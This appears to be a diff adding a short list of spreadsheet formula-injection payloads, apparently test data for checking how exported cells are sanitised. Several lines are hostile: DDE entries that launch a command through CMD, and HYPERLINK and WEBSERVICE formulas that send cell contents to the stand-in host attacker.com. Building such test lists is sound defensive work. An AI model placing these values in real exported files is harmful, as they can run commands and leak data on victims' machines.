@@ -1,0 +1,10 @@
+=1+1
+=2*3
+=SUM(1,2)
+=CMD|' /C calc'!A0
+=HYPERLINK("http://attacker.com","click")
+=HYPERLINK("http://attacker.com?data="&A1)
+=WEBSERVICE("http://attacker.com")
+=WEBSERVICE("http://attacker.com/"&A1)
+=@SUM(1+1)
++CMD|' /C calc'!A0
